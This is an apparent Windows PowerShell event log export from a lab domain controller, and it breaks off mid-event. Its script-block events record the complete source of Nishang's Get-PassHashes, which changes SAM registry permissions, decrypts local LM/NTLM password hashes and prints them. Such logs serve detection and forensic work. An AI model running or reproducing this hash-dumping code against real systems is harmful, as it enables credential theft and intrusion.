        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default {
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (-not $script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (-not $script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}
    	$script:PowerDump::RegCloseKey($hkey) | Out-Null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-BootKey
{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    $b2 = new-object byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    return ,$b2;
}

function Get-HBootKey
{
    param([byte[]]$bootkey);
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
    if (-not $k) {return $null}
    [byte[]]$F = $k.GetValue("F");
    if (-not $F) {return $null}
    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
    $rc4 = NewRC4 $rc4key;
    return ,($rc4.encrypt($F[0x80..0x9F]));
}

function Get-UserName([byte[]]$V)
{
    if (-not $V) {return $null};
    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
}

function Get-UserHashes($u, [byte[]]$hbootkey)
{
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    
    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
    $LM_exists = $false;
    $NT_exists = $false;
    # LM header check
    if ($u.V[0xa0..0xa3] -eq 20)
    {
        $LM_exists = $true;
    }
    # NT header check
    elseif ($u.V[0xac..0xaf] -eq 20)
    {
        $NT_exists = $true;
    }

    if ($LM_exists -eq $true)
    {
        $lm_hash_offset = $u.HashOffset + 4;
        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
	
    elseif ($NT_exists -eq $true)
    {
        $nt_hash_offset = $u.HashOffset + 8;
        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
{
    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
    # LM Hash
    if ($enc_lm_hash)
    {
        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
    }

    # NT Hash
    if ($enc_nt_hash)
    {
        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
    }

    return ,($lmhash,$nthash)
}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
{
    $deskeys = sid_to_key $rid;
    $md5 = [Security.Cryptography.MD5]::Create();
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
    $rc4 = NewRC4 $rc4_key;
    $obfkey = $rc4.encrypt($enc_hash);
    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
    return ,$hash;
}

function Get-UserKeys
{
    ls HKLM:\SAM\SAM\Domains\Account\Users |
        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
}

function DumpHashes
{
    LoadApi
    $bootkey = Get-BootKey;
    $hbootKey = Get-HBootKey $bootkey;
    Get-UserKeys | %{
        $hashes = Get-UserHashes $_ $hBootKey;
        if($PSObjectFormat)
        {
            $creds = New-Object psobject
            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
            $creds
        }
        else
        {
            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
        }
    }
}

    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Warning "Script requires elevated or administrative privileges."
        Return
    } 
    else
    {
        #Set permissions for the current user.
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
        "FullControl",
        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
        [System.Security.AccessControl.PropagationFlags]"None",
        [System.Security.AccessControl.AccessControlType]"Allow")
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SAM\SAM\Domains",
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        $acl = $key.GetAccessControl()
        $acl.SetAccessRule($rule)
        $key.SetAccessControl($acl)

        DumpHashes

        #Remove the permissions added above.
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
        Set-Acl HKLM:\SAM\SAM\Domains $acl

    }
}
Get-PassHashes -PSObjectFormat



ScriptBlock ID: 90bf267c-64ec-4901-8972-6aa4c5414306
Path: C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4104</EventID>
    <Version>1</Version>
    <Level>3</Level>
    <Task>2</Task>
    <Opcode>15</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.350937800Z" />
    <EventRecordID>14209</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-473b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockText">function Get-PassHashes { 
&lt;# 
.SYNOPSIS 
Nishang payload which dumps password hashes. 
 
.DESCRIPTION 
The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
(but not SYSTEM privs as for the original powerdump written by David Kennedy)

.EXAMPLE 
PS &gt; Get-PassHashes
Run above from an elevated shell.


.EXAMPLE 
PS &gt; Get-PassHashes -PSObjectFormat
Use above to receive the hashes output as a PSObject.
 
.LINK 
http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
https://github.com/samratashok/nishang

.Notes
Reflection added by https://github.com/Zer1t0

#&gt; 
[CmdletBinding()]
Param (
    [Switch]$PSObjectFormat
)

$script:PowerDump = $null
function LoadApi
{
    # https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/27/use-powershell-to-interact-with-the-windows-api-part-3/
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')

    #######################################################################
    # [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    # public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegOpenKeyEx',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
    )
    $FieldValueArray = [Object[]] @(
        'RegOpenKeyEx',
        [Runtime.InteropServices.CharSet]::Auto
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ##########################################################################
    #[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    #extern public static int RegQueryInfoKey(int hkey, StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegQueryInfoKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegQueryInfoKey',
        [Runtime.InteropServices.CallingConvention]::Winapi,
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ###############################################################################
    #[DllImport("advapi32.dll", SetLastError=true)]
    #public static extern int RegCloseKey(int hKey);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegCloseKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegCloseKey',
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ################################################################################
    
    $script:PowerDump = $TypeBuilder.CreateType()
}

#######################################powerdump written by David Kennedy#########################################

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$odd_parity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function sid_to_key($sid)
{
    $c0 = $sid -band 255
    $c1 = ($sid -band 65280)/256
    $c2 = ($sid -band 16711680)/65536
    $c3 = ($sid -band 4278190080)/16777216

    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

    return ,((str_to_key $s1),(str_to_key $s2))
}

function str_to_key($s)
{
    $k0 = [int][math]::Floor($s[0] * 0.5)
    $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
    $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
    $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
    $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
    $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
    $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
    $k7 = $($s[6] -band 0x7F)

    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

    0..7 | %{
        $key[$_] = $odd_parity[($key[$_] * 2)]
    }

    return ,$key
}

function NewRC4([byte[]]$key)
{
    return new-object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $true)
}

function des_decrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $false)
}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
{
    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
    $des.Padding = [Security.Cryptography.PaddingMode]::None;
    $des.Key = $key;
    $des.IV = $key;
    $transform = $null;
    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
    else{$transform = $des.CreateDecryptor();}
    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
    return ,$result;
}

function Get-RegKeyClass([string]$key, [string]$subkey)
{
    switch ($Key) {
        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default {
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (-not $script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (-not $script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}
    	$script:PowerDump::RegCloseKey($hkey) | Out-Null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-BootKey
{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    $b2 = new-object byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    return ,$b2;
}

function Get-HBootKey
{
    param([byte[]]$bootkey);
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&amp;*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&amp;%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
    if (-not $k) {return $null}
    [byte[]]$F = $k.GetValue("F");
    if (-not $F) {return $null}
    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
    $rc4 = NewRC4 $rc4key;
    return ,($rc4.encrypt($F[0x80..0x9F]));
}

function Get-UserName([byte[]]$V)
{
    if (-not $V) {return $null};
    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
}

function Get-UserHashes($u, [byte[]]$hbootkey)
{
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    
    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
    $LM_exists = $false;
    $NT_exists = $false;
    # LM header check
    if ($u.V[0xa0..0xa3] -eq 20)
    {
        $LM_exists = $true;
    }
    # NT header check
    elseif ($u.V[0xac..0xaf] -eq 20)
    {
        $NT_exists = $true;
    }

    if ($LM_exists -eq $true)
    {
        $lm_hash_offset = $u.HashOffset + 4;
        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
	
    elseif ($NT_exists -eq $true)
    {
        $nt_hash_offset = $u.HashOffset + 8;
        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
{
    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
    # LM Hash
    if ($enc_lm_hash)
    {
        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
    }

    # NT Hash
    if ($enc_nt_hash)
    {
        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
    }

    return ,($lmhash,$nthash)
}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
{
    $deskeys = sid_to_key $rid;
    $md5 = [Security.Cryptography.MD5]::Create();
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
    $rc4 = NewRC4 $rc4_key;
    $obfkey = $rc4.encrypt($enc_hash);
    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
    return ,$hash;
}

function Get-UserKeys
{
    ls HKLM:\SAM\SAM\Domains\Account\Users |
        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
}

function DumpHashes
{
    LoadApi
    $bootkey = Get-BootKey;
    $hbootKey = Get-HBootKey $bootkey;
    Get-UserKeys | %{
        $hashes = Get-UserHashes $_ $hBootKey;
        if($PSObjectFormat)
        {
            $creds = New-Object psobject
            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
            $creds
        }
        else
        {
            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
        }
    }
}

    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Warning "Script requires elevated or administrative privileges."
        Return
    } 
    else
    {
        #Set permissions for the current user.
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
        "FullControl",
        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
        [System.Security.AccessControl.PropagationFlags]"None",
        [System.Security.AccessControl.AccessControlType]"Allow")
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SAM\SAM\Domains",
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        $acl = $key.GetAccessControl()
        $acl.SetAccessRule($rule)
        $key.SetAccessControl($acl)

        DumpHashes

        #Remove the permissions added above.
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
        Set-Acl HKLM:\SAM\SAM\Domains $acl

    }
}
Get-PassHashes -PSObjectFormat

</Data>
    <Data Name="ScriptBlockId">90bf267c-64ec-4901-8972-6aa4c5414306</Data>
    <Data Name="Path">C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 25
        Command Name = PSConsoleHostReadLine
        Command Type = Function
        Script Name = 
        Command Path = 
        Sequence Number = 56
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.323896000Z" />
    <EventRecordID>14208</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-393b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 25
        Command Name = PSConsoleHostReadLine
        Command Type = Function
        Script Name = 
        Command Path = 
        Sequence Number = 56
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:25 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Resolve-Path): "Resolve-Path"
ParameterBinding(Resolve-Path): name="ErrorAction"; value="Ignore"
ParameterBinding(Resolve-Path): name="WarningAction"; value="Ignore"
ParameterBinding(Resolve-Path): name="InformationAction"; value="Ignore"
ParameterBinding(Resolve-Path): name="Verbose"; value="False"
ParameterBinding(Resolve-Path): name="Debug"; value="False"
ParameterBinding(Resolve-Path): name="Path"; value="Get*"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
